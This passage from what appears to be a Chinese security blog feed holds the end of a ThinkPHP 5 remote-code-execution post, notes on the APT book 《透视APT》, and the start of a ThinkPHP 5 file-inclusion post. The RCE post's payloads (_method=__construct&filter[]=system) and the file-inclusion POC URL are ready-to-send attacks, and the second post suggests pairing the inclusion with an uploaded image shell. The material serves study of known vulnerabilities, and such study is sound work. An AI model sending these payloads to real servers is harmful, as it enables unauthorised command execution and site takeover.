&#x2F;</span><br><span class="line">_method&#x3D;__construct&amp;filter[]&#x3D;system&amp;server[REQUEST_METHOD]&#x3D;ls -al</span><br><span class="line"></span><br><span class="line"># ThinkPHP &lt;&#x3D; 5.0.23 需要存在xxx的method路由，例如captcha</span><br><span class="line">POST &#x2F;?s&#x3D;xxx HTTP&#x2F;1.1</span><br><span class="line">_method&#x3D;__construct&amp;filter[]&#x3D;system&amp;method&#x3D;get&amp;get[]&#x3D;ls+-al</span><br><span class="line">_method&#x3D;__construct&amp;filter[]&#x3D;system&amp;method&#x3D;get&amp;server[REQUEST_METHOD]&#x3D;ls</span><br></pre></td></tr></table></figure><h2 id="漏洞概述-2"><a href="#漏洞概述-2" class="headerlink" title="漏洞概述"></a>漏洞概述</h2><p>和上一个RCE直接原因一样，都是没有对控制器进行很好的合法性校验。</p><p>漏洞存在于 <strong>ThinkPHP</strong> 底层没有对控制器名进行很好的合法性校验，导致在未开启强制路由的情况下，用户可以调用任意类的任意方法，最终导致 <strong>远程代码执行漏洞</strong> 的产生。</p><h2 id="影响版本-2"><a href="#影响版本-2" class="headerlink" title="影响版本"></a>影响版本</h2><p><strong>5.0.0&lt;=ThinkPHP5&lt;=5.0.23</strong> 、<strong>5.1.0&lt;=ThinkPHP&lt;=5.1.30</strong></p><h2 id="漏洞分析-2"><a href="#漏洞分析-2" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><h2 id="利用总结-2"><a href="#利用总结-2" class="headerlink" title="利用总结"></a>利用总结</h2><h2 id="漏洞修复-2"><a href="#漏洞修复-2" class="headerlink" title="漏洞修复"></a>漏洞修复</h2>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;主要参考资料：&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://github.com/Mochazz/ThinkPHP-Vuln/&quot;&gt;https://github.com/Mochazz/ThinkPHP-Vuln/&lt;/a&gt;&lt;/p&gt;
&lt;h1 id=&quot;RCE1-利用缓存文件G</summary>
      
    
    
    
    
    <category term="代码审计" scheme="https://hack-for.fun/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    <category term="RCE" scheme="https://hack-for.fun/tags/RCE/"/>
    
  </entry>
  
  <entry>
    <title>《透视APT》读书笔记</title>
    <link href="https://hack-for.fun/0.html"/>
    <id>https://hack-for.fun/0.html</id>
    <published>2020-09-20T16:00:00.000Z</published>
    <updated>2020-09-22T02:51:54.505Z</updated>
    
    <content type="html"><![CDATA[<p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200922011215.png"></p><h1 id="《透视APT》"><a href="#《透视APT》" class="headerlink" title="《透视APT》"></a>《透视APT》</h1><h2 id="网络空间中的对抗"><a href="#网络空间中的对抗" class="headerlink" title="网络空间中的对抗"></a>网络空间中的对抗</h2><h3 id="APT的典型事件之——“震网病毒”"><a href="#APT的典型事件之——“震网病毒”" class="headerlink" title="APT的典型事件之——“震网病毒”"></a>APT的典型事件之——“震网病毒”</h3><ul><li>目标系统：工控系统</li><li>潜伏渗透：感染了伊朗境内60%的PC</li><li>突破物理隔离：U盘(病毒检测到宿主机插上U盘则主动向U盘感染病毒)</li><li>技术水平：同时利用多个0day(微软和西门子工控系统)，体现了APT的高级性</li><li>攻击者：极有可能是敌对关系的政治势力</li><li>攻击持续性：C2服务器2005.11就完成注册,可能长达6~7年</li></ul><h3 id="APT攻击的概念"><a href="#APT攻击的概念" class="headerlink" title="APT攻击的概念"></a>APT攻击的概念</h3><ul><li><p>起源</p><ul><li>由美国一名空军上校2006年提出</li></ul></li><li><p>何时引起关注、高潮</p><ul><li>2010伊朗震网病毒、2013美国”棱镜门”事件</li></ul></li><li><p>定义</p><ul><li><p>知名第三方机构</p><ul><li><p>维基百科、Mandiant、赛门铁克、Damballa、TechTarget</p><ul><li>1.特性：高级、持续、威胁、针对。</li></ul></li></ul></li></ul></li></ul><p>2.目标动机：政治、情报、数据、经济利益<br>3.APT目标：国防、制造业、金融、科研</p><pre><code>- 奇安信威胁情报中心    - 不是一个纯粹的技术概念，泛指有组织，有计划针对特定目标的一系列攻击    - 组织        - 国家或者政府(精神支持和物质基础)        - 情报机构、网络间谍活动的攻击组织        - 经济实体、犯罪组织、恐怖主义组织    - 能力：攻击不计成本(技术成本,比如系统0day)    - 技术特点：针对性、高度隐藏(潜伏渗透周期长)、不以经济利益为直接目的、掌握0day    - 重大安全事件不一定是APT        - 重大损失的，也不一定是APT            - 2016年美国东部互联网瘫痪</code></pre><p>2018年Facebook数据泄露<br>国内酒店大量住户信息泄露</p><pre><code>        - 影响范围大的，也不一定是APT            - 2017年WannaCry勒索病毒        - 针对性强的，也不一定是APT            - 2008年8月俄罗斯对格鲁吉亚的军事行动- APT 与威胁情报    - 威胁情报：安全机构所掌握的、针对特定组织机构的各种网络威胁信息，而该组织机构自身可能并不知道相关威胁的存在或细节        - 威胁情报的主要方面            - 源头、目标、动机、工具、指标、表象、影响、方案</code></pre><h3 id="相关研究"><a href="#相关研究" class="headerlink" title="相关研究"></a>相关研究</h3><ul><li>在全球范围内，APT研究美国和俄罗斯两国属世界一流，中国属全球第二梯队的排头兵</li><li>行业领域：军队与国防、政府、金融、外交、能源、科研、医疗、传媒、电信</li><li>目标地域：全球绝大部分的国家和地区。韩国、中东、美国、俄罗斯、巴基斯坦等国家APT最为活跃</li></ul><h2 id="APT攻击的对象"><a href="#APT攻击的对象" class="headerlink" title="APT攻击的对象"></a>APT攻击的对象</h2><h3 id="工控系统"><a href="#工控系统" class="headerlink" title="工控系统"></a>工控系统</h3><ul><li><p>乌克兰圣诞大停电事件</p><ul><li>核心攻击方式：BlackEnergy 后门程序、攻击者可远程访问并操控电力控制系统</li></ul></li><li><p>沙特阿拉伯大赦之夜攻击事件</p><ul><li><p>核心攻击方式：Shamoon(Disttrack)，能够导致目标网络完全瘫痪(通过当前的权限来访问活动目录、相同域及局域网其他主机进行横向移动)</p><ul><li>投放器(Dropper)</li><li>通信组件(Communications)</li><li>擦除组件(Wiper)</li></ul></li></ul></li><li><p>美国电网承包商攻击事件</p><ul><li>核心攻击方式：渗透网站，向网站上传恶意程序，利用恶意程序跟踪网站访问者，获得相关人员的账号密码，利用该账号发送大量钓鱼邮件</li></ul></li></ul><h3 id="金融系统"><a href="#金融系统" class="headerlink" title="金融系统"></a>金融系统</h3><ul><li><p>多国银行被盗事件</p><ul><li>核心攻击方式：<br>获得银行SWIFT权限，利用SWIFI向其他银行发送转账指令、篡改MT9XX报文清除证据</li></ul></li><li><p>ATM 机盗窃事件</p><ul><li>核心攻击方式：</li></ul></li></ul><p>1.针对性入侵金融机构员工的计算机或银行网络，进行视频监控，查看和记录负责转账系统的银行员工屏幕。获取足够的信息后，模仿银行员工的行为进行恶意操作。<br>2.插入特别制造的芯片(EMV)卡，植入恶意程序，吐钞的同时让计算机断网<br>3.入侵其他资产，通过资产内代理进行授权交易<br>4.入侵内部网络、获得ATM控制权限<br>5.通过光驱、USB接口等直接对ATM机进行操作</p><ul><li><p>黄金眼(国内APT组织)行动事件</p><ul><li>核心攻击方式：以合法软件开发公司伪装，以不当盈利作为目的，长期从事敏感金融交易信息窃取活动。（该组织攻击水平和反侦察能力均达到国际水平)</li></ul></li></ul><h3 id="地缘政治"><a href="#地缘政治" class="headerlink" title="地缘政治"></a>地缘政治</h3><ul><li><p>DNC邮件泄露、美国大选</p><ul><li>希拉里邮件门事件，利用私人电子邮件向家里私人服务器发送大量涉及国家机密的绝密邮件，大约6万封。</li><li>相关细节：希拉里竞选团队主席被钓鱼攻击上钩，泄露邮箱密码，从而获取邮箱中的邮件，同样的攻击方法在团队其他成员中也相继成功。钓鱼邮件使用了(Bitly)短链接技术来进行伪装。</li></ul></li><li><p>法国总统大选</p><ul><li>攻击组织：APT-28<br>文档:Trump’s_Attack_On_Syria_English.docx<br>核心攻击技术：<br>CVE-2017-0262(Word远程代码执行)<br>CVE-2017-0263(Windows本地权限升级)</li></ul></li></ul><h3 id="教育、科研系统"><a href="#教育、科研系统" class="headerlink" title="教育、科研系统"></a>教育、科研系统</h3><ul><li>国内顶尖大学、研究院</li><li>国内海事、电信、能源、国防、军工业</li></ul><h2 id="APT攻击的技术手段"><a href="#APT攻击的技术手段" class="headerlink" title="APT攻击的技术手段"></a>APT攻击的技术手段</h2><h3 id="APT攻击的目标"><a href="#APT攻击的目标" class="headerlink" title="APT攻击的目标"></a>APT攻击的目标</h3><ul><li><p>敏感情报信息</p><ul><li><p>PC敏感文件扩展名</p><ul><li>doc,docx,ppt,pptx,xls,xlsx,rtf,wps,et,dps,pdf,txt,dwg,rar,zip,7z,exe,eml</li></ul></li><li><p>移动端敏感文件</p><ul><li>音频、照片、通话录音、录像、通话记录、通讯录、短信、手机基本信息、地理位置信息</li></ul></li><li><p>敏感情报信息窃取方式</p><ul><li>核心思想：选择性窃取（攻击者如果活动太频繁，木马与C&amp;C服务器的通信次数越多越容易暴露）。故APT组织一般只收集特定目录下的文件或者有特殊文件名的文件。</li><li>文件直接回传、Socket通信、 电子邮件</li></ul></li></ul></li><li><p>敏感文件</p></li><li><p>经济利益</p></li><li><p>持续监控</p></li><li><p>破坏</p></li><li><p>攻击目标平台</p><ul><li><p>Windows、Android、MacOS、iOS</p></li><li><p>跨平台的水坑攻击</p><ul><li>带有恶意程序的伪造Flash升级包</li></ul></li></ul></li></ul><h3 id="APT攻击的武器搭载系统"><a href="#APT攻击的武器搭载系统" class="headerlink" title="APT攻击的武器搭载系统"></a>APT攻击的武器搭载系统</h3><ul><li><p>鱼叉攻击(Spear Phishing)</p><ul><li><p>目的：不通过授权访问机密数据</p></li><li><p>手段：最常见的方式是通过电子邮件发送给特定的攻击目标，诱使目标打开附件，这种方式就是鱼叉邮件。</p><ul><li>钓鱼邮件：这个概念和鱼叉邮件类似。不过，钓鱼多是针对普通人的攻击，针对性较弱，精确度较低。</li></ul></li><li><p>实施过程：前期准备-&gt;邮件制作-&gt;邮件投放-&gt;情报回收</p></li><li><p>防护方法：稍微有点安全意识即可，认真查看邮件来源，附件扩展名，病毒扫描，虚拟机，沙箱等。</p></li></ul></li><li><p>水坑攻击(Water Holing)</p><ul><li><p>攻击概述：攻击者通过分析攻击目标的网络活动规律，寻找攻击目标经常访问的网站的弱点，先攻下该站点并植入攻击程序，在攻击目标访问该站点时实施攻击</p></li><li><p>以海莲花APT组织的水坑攻击举例</p><ul><li><p>A方式</p><ul><li>替换目标网站的可信程序(捆绑即时通、证书驱动)</li><li>对目标网站插入恶意JavaScript程序(伪装成Adobe Flash更新程序)</li></ul></li><li><p>B方式</p><ul><li>替换目标网站站点指定链接</li></ul></li></ul></li></ul></li><li><p>PC跳板</p></li><li><p>第三方平台</p><ul><li>APT组织通过社交网络来下发C&amp;C指令，APT组织的专用木马会读取文章中的程序指令来完成指定的攻击操作</li><li>微博、Twitter、Facebook、…</li></ul></li><li><p>恶意硬件中间人劫持</p><ul><li><p>在目标网络环境中部署物理硬件设备，通过中间人方式劫持用户网络流量，替换更新包等软件</p><ul><li>输入法软件、聊天软件、下载软件、影音软件、安全软件、微软系统软件</li></ul></li><li><p>例子：火焰病毒</p></li></ul></li></ul><h3 id="APT攻击的武器装备"><a href="#APT攻击的武器装备" class="headerlink" title="APT攻击的武器装备"></a>APT攻击的武器装备</h3><ul><li><p>专用木马</p><ul><li><p>开机自启动</p><ul><li><p>修改快捷方式</p></li><li><p>DLL(动态链接库)劫持</p></li><li><p>修改注册表、服务、计划任务</p></li><li><p>APT组织为何放弃开机自启动？</p><ul><li><p>特定场景下需要一次性攻击</p><ul><li>火力侦察判断目标是否为真实目标时、目标防护能力很强时（都是为了隐藏自己的攻击</li></ul></li><li><p>依赖原始母体文件运行</p></li><li><p>用其他方法启动木马</p><ul><li>注入到其他进程、或者捆绑到其他软件</li><li>利用漏洞劫持篡改网络流量</li></ul></li></ul></li></ul></li><li><p>加密与自加密</p></li><li><p>木马升级换代</p></li></ul></li><li><p>1day \ nday</p><ul><li><p>出于攻击技术成本考虑、目标系统存在大量已知漏洞但未修复</p></li><li><p>相关例子</p><ul><li><p>CVE-2012-0158</p><ul><li>微软Office漏洞(非常稳定)，远程攻击者诱使目标打开一个经过特殊构造的RTF文件，在符合漏洞条件下，即可在目标机器上执行任意指令。</li></ul></li><li><p>CVE-2015-0097</p><ul><li>微软Office的一个逻辑漏洞，可导致目标通过HTA文件下载恶意程序到本机并执行</li></ul></li><li><p>Android 漏洞</p></li></ul></li></ul></li><li><p>0day</p><ul><li>Office 文档漏洞</li><li>Windows 提权漏洞</li><li>Flash 漏洞</li><li>其他0day</li></ul></li><li><p>APT组织武器使用成本原则(0day、或者技术成本较高的攻击手段)</p><ul><li>攻击目标具有足够的攻击价值</li><li>一般的专用木马攻击无效或者无法达到预期目的</li><li>利用1day、nday攻击依然无法达到目的或者无效</li></ul></li><li><p>APT武器研发趋势</p><ul><li><p>特别关注点：RAT(Remote Access Trojan)文件,远程访问木马的文件格式、文件形态、功能形态、恶意程序寄宿位置的变化</p></li><li><p>相关武器研发趋势</p><ul><li><p>从PE到非PE，从有实体到无实体</p></li><li><p>小众编程语言日渐流行(Delphi\GCC\NSIS\AutoIt</p></li><li><p>模块互动，云控技术渐成主流</p></li><li><p>恶意程序寄宿位置越藏越深：从常见的系统目录到难以追踪的MBR, VBR, 磁盘固件, EFI, BIOS, 移动存储设备的隐藏分区</p></li><li><p>独立研发与委托定制成主流</p><ul><li>使用公开的RAT，目的是自我隐藏和嫁祸他人</li><li>绝大部分的APT组织都是在相对独立的环境下完成攻击代码的开发工作</li><li>不排除委托第三方组成协助定制开发的可能性</li></ul></li></ul></li></ul></li></ul><h3 id="APT攻击的-C-amp-C-Command-and-Control"><a href="#APT攻击的-C-amp-C-Command-and-Control" class="headerlink" title="APT攻击的 C&amp;C(Command and Control)"></a>APT攻击的 C&amp;C(Command and Control)</h3><ul><li>主要作用：</li></ul><p>1.向感染了目标机的木马程序发送控制命令，提供下载资源(新木马，木马模块，配置文件等)<br>2.回收木马程序收集到的情报信息，包括文件、邮件等</p><ul><li><p>地域分布</p><ul><li><p>美国最多、其次中国、俄罗斯，西班牙，德国并列第三(2015年)</p><ul><li>一个APT组织可能拥有数十个，或者几个分布于不同地域的C&amp;C服务器</li></ul></li></ul></li><li><p>注册机构</p><ul><li><p>国内外APT组织均使用或部分使用境外服务商动态域名，ChangIP,DynDNS,No-IP,Afraid(FreeDNS),dnsExit</p><ul><li>动态域名的好处：</li></ul></li></ul></li></ul><p>1.相关注册信息不对外公开(无whois信息)<br>2.需要域名持有者的权限才能查询相关信息</p><ul><li><p>注册偏好</p><ul><li><p>模仿邮箱类</p><ul><li>126mailserver 、mail163等</li></ul></li><li><p>模仿杀毒软件类</p><ul><li>safe360、rising等</li></ul></li><li><p>模仿互联网公司类</p><ul><li>360sc2、sohu、sogou、sina等</li></ul></li></ul></li></ul><h2 id="APT攻击的战术布阵"><a href="#APT攻击的战术布阵" class="headerlink" title="APT攻击的战术布阵"></a>APT攻击的战术布阵</h2><h3 id="情报收集"><a href="#情报收集" class="headerlink" title="情报收集"></a>情报收集</h3><ul><li><p>重要性：APT组织发动一次攻击，绝大部分时间都会消耗在情报收集环节上。为了达到攻击目的，攻击者必须尽可能地全面的收集攻击目标相关的情报信息，从认知水平到掌握水平。</p></li><li><p>公开情报收集</p><ul><li>官方网站、行业网站、学术期刊、行业会议、新闻报道等</li></ul></li><li><p>地下情报收集</p><ul><li>地下黑市购买社工库</li><li>入侵第三方网站以获取目标人员、组织的情报信息</li><li>向其他APT组织购买情报信息</li></ul></li></ul><h3 id="火力侦察"><a href="#火力侦察" class="headerlink" title="火力侦察"></a>火力侦察</h3><ul><li>目的：收集攻击目标网络或设备的基本信息、判断攻击目标的真伪(是否为虚拟机)、防御能力、攻击价值。以及方便后期横向移动的准确性。</li><li>主机信息：操作系统信息、主机名称、本地用户名等</li><li>网络信息：主要是IP地址、网关信息</li><li>应用程序信息及相关版本信息，微软Office、微软Internet Explorer</li><li>磁盘信息、当前进程信息等</li></ul><h3 id="供应链攻击"><a href="#供应链攻击" class="headerlink" title="供应链攻击"></a>供应链攻击</h3><ul><li><p>攻击原理</p><ul><li>当攻击目标本身的防御措施特别完善时，或初始攻击无法达到效果，对目标相关的周边企业、人员、供应链进行攻击，有可能取得较好的效果。</li></ul></li><li><p>典型案例</p><ul><li>震网病毒、Havex</li></ul></li></ul><h3 id="假旗行动"><a href="#假旗行动" class="headerlink" title="假旗行动"></a>假旗行动</h3><ul><li><p>概述</p><ul><li><p>也叫伪旗行动，是隐蔽行动的一种。通过使用其他组织的旗帜、制服等手段误导公众、使公众认为该攻击是其他攻击组织执行。</p><ul><li>相关战术术语：拟态、诱饵、混淆、伪装、干扰</li></ul></li></ul></li><li><p>类型</p><ul><li><p>预设陷阱</p><ul><li>样本文件、C&amp;C服务器域名、特殊字符串、上线密码、诱饵文档属性信息等</li></ul></li><li><p>事后掩盖</p><ul><li>攻击成功后，对域名whois、IP地址等信息进行伪装</li></ul></li></ul></li><li><p>冒充对象</p><ul><li>冒充其他APT组织</li><li>冒充普通用户</li></ul></li><li><p>国家级情报机构对该行动的观点</p><ul><li><p>五眼联盟</p><ul><li>与欺骗相关的策略：暗区(DarkSpace)、蜜罐(Honeypot)、蜜令(Honeytoken)、蜜网(Honeynet)、假旗行动(False Flag)、效果(Effects)</li></ul></li><li><p>五眼联盟对假旗行动的观点：1.有意制造攻击目标与被嫁祸国或组织间紧张的敌对气氛，以实现某种政治或经济目的 2.更好地隐藏自己，避免暴露，收获更大利益。</p></li></ul></li></ul><h3 id="周期性袭扰"><a href="#周期性袭扰" class="headerlink" title="周期性袭扰"></a>周期性袭扰</h3><ul><li>周一、二（工作日处理邮件、文件高峰期）</li><li>大型节日（如国庆节、春节等）</li></ul><h3 id="横向移动"><a href="#横向移动" class="headerlink" title="横向移动"></a>横向移动</h3><ul><li>目的：</li></ul><p>1.进一步在感染的目标机器上获取更多有价值的信息<br>2. 借助受感染的机器，探测周边其他设备的情况或直接向周边设备发动攻击</p><ul><li><p>横向移动攻击步骤</p><ul><li>侦察和识别网络拓扑、获取域计算机信息、当前计算机相关主机信息、网卡信息、路由信息等</li><li>查看远程计算机服务及状态、获取指定IP共享信息、共享目录、扫描内网机器远程端口等</li><li>补充原有木马没有的功能、窃取本机更多信息、向周边其他设备发动攻击</li><li>常用命令：net view、ipconfig /all、netstat -a/n、nbstat -A、systeminfo、tracert -w 1000 8.8.8.8、ping、telnet、利用PowerShell远程加载木马或者上传情报信息到C&amp;C服务器</li></ul></li></ul><h3 id="伪装术"><a href="#伪装术" class="headerlink" title="伪装术"></a>伪装术</h3><ul><li><p>社会工程学伪装</p><ul><li>邮件内容伪装</li><li>邮件身份伪装</li></ul></li><li><p>文件视觉伪装</p><ul><li>文件名</li><li>文件扩展名</li><li>文件图标</li></ul></li><li><p>快捷方式伪装</p><ul><li>将攻击代码文件和一个指向攻击代码的快捷方式文件打包成一个压缩包，同时，快捷方式的命名具有迷惑性</li></ul></li><li><p>捆绑合法程序</p><ul><li><p>AWVS7</p><ul><li>针对网络安全行业</li></ul></li><li><p>办公软件</p><ul><li>政府单位、事业单位</li></ul></li><li><p>即时通、证书驱动</p><ul><li>政府机构</li></ul></li><li><p>微软更新程序</p></li><li><p>Microsoft Visio Professional 2013</p></li></ul></li><li><p>压缩包外壳</p><ul><li>将木马程序进行压缩，以压缩包的形式传播</li></ul></li></ul><h3 id="反侦察术"><a href="#反侦察术" class="headerlink" title="反侦察术"></a>反侦察术</h3><ul><li>一些APT组织的攻击木马会判断自身所处的环境、发现杀软时、会选择放弃执行后续的功能代码、或者设法绕过杀软的监测。</li><li>一些APT组织会对安全研究人员进行反向侦察工作，比如海莲花组织向AWVS的破解版中插入了木马。</li></ul><h2 id="APT攻击的监测与防御"><a href="#APT攻击的监测与防御" class="headerlink" title="APT攻击的监测与防御"></a>APT攻击的监测与防御</h2><h3 id="如何发现APT攻击"><a href="#如何发现APT攻击" class="headerlink" title="如何发现APT攻击"></a>如何发现APT攻击</h3><ul><li><p>大数据技术</p><ul><li>数据采集、数据分析、数据呈现</li></ul></li><li><p>威胁情报技术</p><ul><li><p>“标志”(Indicator of Compromise,IOC),也叫入侵指示器：通常包括主机活动中出现的文件、进程、注册表键值、系统服务、网络上的域名、URL、IP等</p></li><li><p>分类</p><ul><li><p>战术情报</p><ul><li>标记攻击者使用工具相关的特纸值及网络基础设施信息、可直接用于设备、实现对攻击活动的监控，IOC即是一个典型</li></ul></li><li><p>作战情报</p><ul><li>描述攻击者的工具、技术和过程，即TTP</li></ul></li><li><p>战略情报</p><ul><li>描述当前对于特定组织的威胁类型和对手现状、指导安全投资的大方向。使用者为CSO(Chief Security Officer), CISO(Chief Information Security Offier)</li></ul></li></ul></li><li><p>威胁情报的利用</p><ul><li><p>~在准备阶段、检测与分析阶段、隔离，清除，与恢复阶段、事后复盘阶段的作用</p></li><li><p>安全运营团队会遇到的问题</p><ul><li>如何高效地发现攻击和入侵活动，评估影响面</li><li>如何获取、处置与已经发现安全事件相关的活动</li><li>如何基于对对手的了解、设置各个环节上的安全控制措施、以阻止相同对手或类似攻击手法的入侵</li><li>理解目前安全威胁的全貌、实现有效的安全投资</li></ul></li></ul></li></ul></li><li><p>流量威胁检测技术</p><ul><li>流量威胁分析</li><li>流量日志存储</li><li>威胁回溯分析</li></ul></li><li><p>网络检测响应技术(Network-based Detection and Response,NDR)</p></li><li><p>终端检测响应技术(Endpoint Detection and Response,EDR)</p><ul><li>基于终端大数据分析的新一代终端安全产品，能对终端行为数据进行全面采集、实时上传、对终端进行持续检测和分析、增强对内部威胁事件的深度可见性，结合相关威胁情报中心推送的情报信息(IP、URL、文件Hash等)能帮助企业快速发现，精确定位高级威胁入侵</li></ul></li></ul><h3 id="如何分析APT攻击"><a href="#如何分析APT攻击" class="headerlink" title="如何分析APT攻击"></a>如何分析APT攻击</h3><ul><li><p>网络杀伤链模型(Cyber Kill Chain)</p><ul><li><p>侦察</p><ul><li>攻击者选择目标、进行研究、搜集目标弱点</li></ul></li><li><p>武器化</p><ul><li>攻击者创建针对一个或多个漏洞定制的远程访问恶意程序武器，比如病毒或蠕虫</li></ul></li><li><p>散布</p><ul><li>将网络武器包向目标投放</li></ul></li><li><p>恶用</p><ul><li>在受害者系统上运行代码</li></ul></li><li><p>设置</p><ul><li>在目标位置安装恶意程序</li></ul></li><li><p>命令和控制</p><ul><li>为攻击者建立可远程控制目标系统的路径</li></ul></li><li><p>目标达成</p><ul><li>攻击者远程完成其预期效果</li></ul></li></ul></li><li><p>钻石模型</p><ul><li><p>攻击者</p><ul><li>分清攻击者有利用了解其目的、归属、适应性和持久性</li></ul></li><li><p>能力</p><ul><li>事件中使用的工具或技术</li></ul></li><li><p>基础设施</p><ul><li>攻击者用来传递能力的物理或逻辑结构，如IP地址、域名、邮件地址、USB设备等</li></ul></li><li><p>受害者</p><ul><li>以社会-政治为支点的安全分析中，受害者作用重大</li></ul></li></ul></li><li><p>自适应安全架构(Adaptive Security Architecture,ASA)</p><ul><li>由美国安全公司Gartner于2014年提出的面向未来的下一代安全架构，从预测、防御、检测、响应四个维度，强度安全防护是一个持续处理、循环的过程，是细粒度、多角度、持续化地对安全威胁进行实时动态分析</li><li>目的：为了解决当前企业的安全防护功能难以应对高级定向攻击的问题</li><li>最终效果：达到网络安全的可管、可控、可视、可调度、可持续</li></ul></li></ul><h3 id="协同联动的纵深防御体系"><a href="#协同联动的纵深防御体系" class="headerlink" title="协同联动的纵深防御体系"></a>协同联动的纵深防御体系</h3><ul><li><p>高级安全威胁的判定</p><ul><li>结合多源头威胁情报应用、沙箱动态行为发现、关联引擎分析</li></ul></li><li><p>安全威胁的处置</p><ul><li>NDR与EDR联动</li></ul></li></ul><h2 id="APT攻击技术-趋势"><a href="#APT攻击技术-趋势" class="headerlink" title="APT攻击技术(趋势)"></a>APT攻击技术(趋势)</h2><h3 id="技术越发高超"><a href="#技术越发高超" class="headerlink" title="技术越发高超"></a>技术越发高超</h3><ul><li><p>非PE文件文件攻击</p><ul><li>文件无需长期驻留磁盘</li><li>核心Payload存放在网络或注册表</li><li>通过系统进程执行Payload</li></ul></li><li><p>开源工具和自动化攻击框架</p><ul><li><p>PowerShell自动化攻击框架</p></li><li><p>CobaltStrike</p><ul><li>Shellcode</li><li>Beacon</li></ul></li><li><p>Koadic</p></li></ul></li><li><p>“Living off the land”技术</p></li></ul><h3 id="国际冲突地区的APT攻击更加活跃"><a href="#国际冲突地区的APT攻击更加活跃" class="headerlink" title="国际冲突地区的APT攻击更加活跃"></a>国际冲突地区的APT攻击更加活跃</h3><ul><li>能源资源、工业、持有不同政见者</li><li>这类APT组织：黄金鼠、人面狮、APT33、APT34等</li></ul><h3 id="网络空间已成为大国博弈新战场"><a href="#网络空间已成为大国博弈新战场" class="headerlink" title="网络空间已成为大国博弈新战场"></a>网络空间已成为大国博弈新战场</h3><ul><li>影响面：政治、经济、军事谈判等</li></ul><h3 id="针对基础设施的破坏性攻击日益活跃"><a href="#针对基础设施的破坏性攻击日益活跃" class="headerlink" title="针对基础设施的破坏性攻击日益活跃"></a>针对基础设施的破坏性攻击日益活跃</h3><ul><li>“互联网+”、5G、万物互联等新兴技术的兴起</li><li>涉及行业：能源、交通、制造、金融、通信等领域</li><li>现状：很多基础设施和生产系统的网络安全体系建设还基本为零</li></ul><h3 id="针对个人移动终端攻击显著增加"><a href="#针对个人移动终端攻击显著增加" class="headerlink" title="针对个人移动终端攻击显著增加"></a>针对个人移动终端攻击显著增加</h3><ul><li>iOS、Android</li><li>系统漏洞、社会工程学</li><li>典型例子：“三叉戟漏洞”</li></ul><h2 id="典型的APT组织机构"><a href="#典型的APT组织机构" class="headerlink" title="典型的APT组织机构"></a>典型的APT组织机构</h2><h3 id="方程式"><a href="#方程式" class="headerlink" title="方程式"></a>方程式</h3><h3 id="索伦之眼"><a href="#索伦之眼" class="headerlink" title="索伦之眼"></a>索伦之眼</h3><h3 id="APT28"><a href="#APT28" class="headerlink" title="APT28"></a>APT28</h3><h3 id="Lazarus"><a href="#Lazarus" class="headerlink" title="Lazarus"></a>Lazarus</h3><h3 id="Group123"><a href="#Group123" class="headerlink" title="Group123"></a>Group123</h3><h2 id="当然还有很多系统级别的漏洞，这里为什么经常用到的都是Office相关的，我个人认为是APT需要前期大量的鱼叉攻击来获取真实的目标信息，而Office在大部分攻击目标的机器上应该都有，作用范围比较大，成功率高的原因吧。"><a href="#当然还有很多系统级别的漏洞，这里为什么经常用到的都是Office相关的，我个人认为是APT需要前期大量的鱼叉攻击来获取真实的目标信息，而Office在大部分攻击目标的机器上应该都有，作用范围比较大，成功率高的原因吧。" class="headerlink" title="当然还有很多系统级别的漏洞，这里为什么经常用到的都是Office相关的，我个人认为是APT需要前期大量的鱼叉攻击来获取真实的目标信息，而Office在大部分攻击目标的机器上应该都有，作用范围比较大，成功率高的原因吧。"></a>当然还有很多系统级别的漏洞，这里为什么经常用到的都是Office相关的，我个人认为是APT需要前期大量的鱼叉攻击来获取真实的目标信息，而Office在大部分攻击目标的机器上应该都有，作用范围比较大，成功率高的原因吧。</h2><p><em>XMind - Trial Version</em></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;img src=&quot;https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200922011215.png&quot;&gt;&lt;/p&gt;
&lt;h1 id=&quot;《透视APT》&quot;&gt;&lt;a href=&quot;#《透视APT》&quot; class=&quot;hea</summary>
      
    
    
    
    
    <category term="APT" scheme="https://hack-for.fun/tags/APT/"/>
    
  </entry>
  
  <entry>
    <title>ThinkPHP5漏洞学习-文件包含漏洞</title>
    <link href="https://hack-for.fun/8d0f.html"/>
    <id>https://hack-for.fun/8d0f.html</id>
    <published>2020-09-16T05:10:50.000Z</published>
    <updated>2020-09-16T15:59:09.731Z</updated>
    
    <content type="html"><![CDATA[<p>[toc]</p><h2 id="ThinkPHP5文件包含漏洞"><a href="#ThinkPHP5文件包含漏洞" class="headerlink" title="ThinkPHP5文件包含漏洞"></a>ThinkPHP5文件包含漏洞</h2><h2 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;public&#x2F;index.php&#x2F;index&#x2F;index?cacheFile&#x3D;favicon.ico</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200916231827.png" alt="image-20200916135216791"></p><p>可配合文件上传图片马，GetShell。(PHP 文件包含都讲文件当做php后缀文件进行解析，与实际文件类型无关)</p><h2 id="漏洞概述"><a href="#漏洞概述" class="headerlink" title="漏洞概述"></a>漏洞概述</h2><p>漏洞存在于 <strong>ThinkPHP</strong> 模板引擎中，在加载模版解析变量时存在<strong>变量覆盖</strong>问题，而且程序没有对数据进行很好的过滤，最终导致 <strong>文件包含漏洞</strong> 的产生。</p><ul><li>变量覆盖漏洞</li></ul><p><a href="https://www.cnblogs.com/wangtanzhi/p/12748967.html">https://www.cnblogs.com/wangtanzhi/p/12748967.html</a></p><p><strong>如果没有指定 flags，则被假定为 EXTR_OVERWRITE。</strong></p><p>代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">$auth = <span 